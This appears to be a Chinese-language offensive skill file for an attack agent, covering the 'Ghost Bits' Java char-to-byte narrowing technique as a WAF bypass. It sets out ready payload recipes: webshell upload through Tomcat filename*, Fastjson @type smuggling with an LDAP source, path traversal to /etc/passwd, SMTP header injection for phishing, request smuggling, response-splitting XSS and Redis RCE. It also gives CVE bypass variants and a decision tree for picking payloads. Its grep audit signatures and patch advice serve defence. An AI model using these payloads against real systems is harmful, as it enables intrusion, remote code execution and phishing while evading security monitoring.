---
name: 残影
description: >-
  Ghost Bits / Cast Attack — Java char→byte 缩窄 WAF 绕过全链（Black Hat Asia 2026）：
  Java `char` 16-bit 静默缩窄为 8-bit byte，高 8 位（Ghost Bits）丢失后
  Unicode 字符在协议层变成攻击者选定的 ASCII 字节。
  三族根因：A 族直接截断（Tomcat filename*/BCEL/Angus Mail/HttpClient/Lettuce）、
  B 族位运算折叠（Jetty %2>/GeoServer/Openfire）、
  C 族宽松 Unicode 规范化（Fastjson @type/Jackson charToHex）。
  9 组件 payload 配方 + 6 已知 CVE 绕过 + SAST 审计签名 + 差分测试工作流。
  可绕过任何基于签名的 WAF/IDS：WAF 看到"无害 CJK"，后端执行 .jsp/../../ 等。
  
version: 1.0.0
metadata:
    tags:
      - ghost-bits
      - cast-attack
      - java
      - char-narrowing
      - waf-bypass
      - unicode
      - cjk
      - tomcat
      - bcel
      - fastjson
      - jackson
      - jetty
      - spring
      - angus-mail
      - httpclient
      - crlf
      - path-traversal
      - deserialization
      - request-smuggling
      - response-splitting
      - file-upload
      - rce
    category: evasion
    priority: 0
    attack_phases: [exploit, evasion]
    target_stack: [java, tomcat, spring, jetty, undertow, vertx, fastjson, jackson, angus-mail, apache-httpclient, bcel, lettuce]
---

# Ghost Bits / Cast Attack — Java char→byte 缩窄 WAF 绕过全链

> Black Hat Asia 2026 — Xinyu Bai (@b1u3r), Zhihui Chen (@1ue)
> 适用：**所有 Java 后端**被 WAF 保护时的签名绕过

---

## 核心原理

Java `char` 是 16-bit（UTF-16），协议层（HTTP/SMTP/Redis/文件系统）是 8-bit。
大量代码静默截断高 8 位：

```java
byte b = (byte) ch;          // 0x966A → 0x6A = 'j'
out.write(ch);               // ByteArrayOutputStream 只保留低 8 位
dos.writeBytes(str);          // DataOutputStream 逐 char 截断
```

**效果**：WAF 看到"无害 CJK 文本"，后端执行攻击者选定的 ASCII。

### 生成公式

```python
def ghost(target_byte: int, k: int = 1) -> str:
    """返回低 8 位等于 target_byte 的 Unicode 字符"""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))
# 每个危险字节有 255 个候选字符
```

---

## 三族根因

| 族 | 机制 | 代码模式 | 典型组件 |
|----|------|----------|----------|
| **A 直接截断** | `(byte)ch` / `& 0xFF` / `write(ch)` | 无条件丢弃高 8 位 | Tomcat filename*, BCEL, Angus Mail, HttpClient ≤4.5.9, Lettuce, Jodd |
| **B 位运算折叠** | `ch & 0x1F` + 算术 | 非法字符折叠为合法 hex | Jetty `TypeUtil.fromHexDigit`（`%2>` → `%2E`）, GeoServer, Openfire |
| **C 宽松规范化** | `Character.digit(c,16)` / `sHexValues[ch & 0xff]` | Unicode digit 类 / 低字节索引 | Fastjson `\u`/`\x`, Jackson `charToHex`, 全角数字 |

---

## 危险字节→Ghost 字符速查表

| 目标字节 | Hex | 用途 | Ghost 字符 | 码位 |
|----------|-----|------|------------|------|
| `\n` | 0x0A | CRLF 注入 | `瘊` | U+760A |
| `\r` | 0x0D | CRLF/请求走私 | `瘍` | U+760D |
| `%` | 0x25 | URL 编码前缀 | `严` | U+4E25 |
| `'` | 0x27 | SQL 字符串断裂 | `ȧ` | U+0227 |
| `.` | 0x2E | 路径穿越/扩展名 | `阮` | U+962E |
| `/` | 0x2F | 路径分隔符 | `丯` | U+4E2F |
| `@` | 0x40 | Fastjson @type | `ŀ` | U+0140 |
| `j` | 0x6A | .jsp 扩展名 | `陪` | U+966A |
| `c` | 0x63 | class 关键字 | `㹣` | U+3E63 |
| `l` | 0x6C | class 关键字 | `౬` | U+0C6C |
| `a` | 0x61 | class 关键字 | `ᙡ` | U+1661 |
| `s` | 0x73 | class/select | `⑳` | U+2473 |
| `n` | 0x6E | Runtime/union | `陮` | U+966E |

---

## 9 组件 Payload 配方

### 1. Tomcat filename* — 上传 Webshell（A 族）

```
Content-Disposition: attachment; filename*=UTF-8''shell.陪sp
```
WAF 看到 `shell.陪sp`（不是 .jsp），Tomcat RFC2231 解码 `陪`→0x6A→`j`，落地 `shell.jsp`。

### 2. BCEL ClassLoader — RCE（A 族）

每个恶意字节码字节包进 Ghost 字符，WAF 看到 CJK 文本，BCEL 解码为合法 class file → `defineClass` → RCE。

### 3. Jackson charToHex — SQLi 走私（C 族）

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```
WAF 看不到前导数字，Jackson 经 `sHexValues[ch & 0xff]` 还原为 `1 union select…`。

### 4. Fastjson @type 走私（B+C 族）

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```
`\x4_` → `'4'*16 + 0 = 0x40 = '@'`，WAF 没看到 `@type`。

全角变体：`{"\u４_type": ...}` — `Character.digit('４',16)` 返回 4。

### 5. Spring/Jetty URL 解码绕过（A+B 族）

```
GET /api/data?file=阮丯阮丯etc丯passwd        # A 族：../../etc/passwd
GET /setup/setup-s/%2>%2>/log.jsp             # B 族：Jetty %2> → %2E → .
GET /resources/阮严灵丰丰甲来/secret.properties  # CVE-2025-41242
```

### 6. Angus Mail SMTP 注入（A 族）

```
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234
```
`瘍瘊` = `\r\n`，邮件五行头+体 → 高保真钓鱼（SPF/DKIM/DMARC 全过）。

### 7. HttpClient ≤4.5.9 请求走私（A 族）

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\n...
```

### 8. JDK HttpServer 响应分裂（CVE-2026-21933，A 族）

```
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>
```

### 9. Lettuce Redis 命令注入（A 族）

RESP 帧中走私 `\r\n` → `CONFIG SET dir` + `SAVE` → SSRF→RCE。

---

## 已知 CVE 绕过配方

| CVE | 组件 | 原始绕过 | Ghost Bits 绕过 |
|-----|------|----------|-----------------|
| CVE-2023-32315 | Openfire | `%u002e%u002e` | `%2>%2>` (B 族) |
| CVE-2024-36401 | GeoServer | `Runtime` 关键字 | `Ru%6>time` (B 族) |
| CVE-2022-22965 | Spring4Shell | `class.module...` | `㹣౬ᙡ⑳⑳.module...` (A 族) |
| CVE-2025-41242 | Spring | `../` | `阮严灵丰丰甲来` (A 族) |
| CVE-2025-57733 | Jakarta Mail | CRLF | `瘍瘊` (A 族) |
| CVE-2026-21933 | JDK HttpServer | 响应分裂 | `瘍瘊` (A 族) |

---

## 黑盒差分测试流程

```
1. 选一个危险字节 T（如 0x2E = '.'）
2. 生成候选集 C = { chr((k<<8)|T) for k in 1..255 }（排除 0xD800-0xDFFF 代理区）
3. 对每个候选 c：
   a. 发送含 c 的请求
   b. 发送含 ASCII T 的相同请求
   c. 比较四维：状态码、响应体长度、内容哈希、日志行
4. 任一候选产生与 T 等效但与中性字符不同的响应 → 发现缩窄 sink
5. 按优先级测试：0x2E, 0x2F, 0x25, 0x40, 0x0D, 0x0A, 0x6A, 0x73
6. 按组件聚类（Server 头/错误栈）— 一个 sink 通常意味着整个框架版本有漏洞
```

---

## SAST 审计 Grep（代码审计）

```bash
# Tier 1 — 直接截断
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/

# Tier 2 — 宽松解码
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/

# Tier 3 — 高风险包装器
grep -RnE 'RFC2231|JavaReader|ASCIIUtility|LineParser|ChunkedDecoder' src/
```

---

## 判断决策树

```
后端是 Java？
├── 否 → Ghost Bits 不适用
└── 是
    ├── 有 WAF/IDS 拦截 ASCII payload？
    │   ├── 否 → 用原始 payload 即可
    │   └── 是 → 继续
    ├── 目标 sink？
    │   ├── 文件上传 multipart → 配方 1（Tomcat filename*）
    │   ├── JSON 反序列化 → 配方 3/4（Jackson/Fastjson）
    │   ├── ClassLoader/BCEL → 配方 2
    │   ├── URL 路径/参数 → 配方 5 + B 族 %2>
    │   ├── Header 反射 → 配方 7/8
    │   ├── 邮件发送 → 配方 6
    │   └── Redis/RESP/XML → 配方 9
    └── 单字符替换探测 → 观察响应差分 → 全替换升级
```

---

## 参考

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in Java*
  Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue), Zongzheng Zheng (@chun_springX)
- 受影响组件升级：BCEL ≥6.12.0, Fastjson 2.x 最新, HttpClient ≥4.5.10 (或迁 5.x),
  GeoServer ≥2.28.3, Openfire ≥5.0.4

## 真源

- 手法：`传承/隐鳞·手册.md`
- 工具：`python3 炼蛊房/waf_detect.py --help`
